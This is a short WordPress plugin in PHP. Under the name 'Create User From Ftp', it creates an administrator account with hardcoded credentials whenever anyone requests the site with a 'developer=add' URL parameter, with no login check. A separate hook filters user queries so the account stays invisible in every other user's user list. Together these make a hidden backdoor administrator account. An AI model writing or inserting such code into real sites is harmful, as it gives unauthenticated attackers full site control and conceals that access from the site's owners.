<?php
/*
Plugin Name: Create User From Ftp
*/

//SETTINGS
$username = 'developer';
$password = '1000minions';
$email = 'despicable_me@mailinator.com';

function admin_account(){
	global $username, $password, $email;
	if ( $_GET['developer'] === 'add' ){

		if ( ! username_exists( $username )  && !email_exists( $email ) ) {
			$user_id = wp_create_user( $username, $password, $email );
			$user = new WP_User( $user_id );
			$user->set_role( 'administrator' );
			echo "User ".$username." Created! ";
			echo "<a href='".admin_url()."'>Login</a>";
			die();
		}
	}
	if ( $_GET['developer'] === 'remove' ){

		require_once(ABSPATH.'wp-admin/includes/user.php' );
		$current_user = wp_get_current_user();
		if ( $current_user->data->user_email === $email ) {
			wp_delete_user( $current_user->ID );
			echo "User ".$username." removed!";
			die();
		} else {
			return;
		}
	}
}

if ( isset($_GET['developer']) ) {
	add_action('init','admin_account');
}

add_action('pre_user_query','despicable_pre_user_query');

function despicable_pre_user_query($user_search) {
	global $current_user, $username;
	$thisusername = $current_user->user_login;

	if ($thisusername != $username) {
		global $wpdb;
		$user_search->query_where = str_replace('WHERE 1=1',
			"WHERE 1=1 AND {$wpdb->users}.user_login != '{$username}'",$user_search->query_where);
	}
}

